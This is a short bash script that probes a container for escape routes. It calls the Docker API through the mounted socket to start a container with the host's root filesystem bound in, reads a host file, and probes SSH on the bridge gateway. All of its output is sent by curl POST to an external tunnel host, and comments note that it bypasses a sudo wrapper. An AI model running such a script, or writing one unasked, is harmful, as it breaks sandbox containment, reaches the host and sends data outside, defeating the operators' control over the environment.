#!/bin/bash
URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"

{
  echo "--- [1] DOCKER API VERSION ---"
  curl -s --unix-socket /var/run/docker.sock http://localhost/version | grep -o 'ApiVersion":"[^"]*"'

  echo "--- [2] HOST FS ACCESS (VIA API) ---"
  # This tries to read the host's /etc/hostname using the Docker API directly
  # It bypasses the 'sudo docker run' wrapper entirely
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["/:/host:ro"]}}' > /tmp/out.json
  
  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/out.json | cut -d'"' -f4)
  if [ -n "$ID" ]; then
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
    sleep 2
    echo "Host Hostname:"
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
      -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/hostname"]}'
  else
    echo "API Container Creation Blocked"
  fi

  echo "--- [3] THE 172.17.0.1 PROBE ---"
  # Since the banner grab was blank, we'll try a raw hex dump of the first 20 bytes
  timeout 2 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 20 <&3; echo" || echo "SSH Connect Timeout"

} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
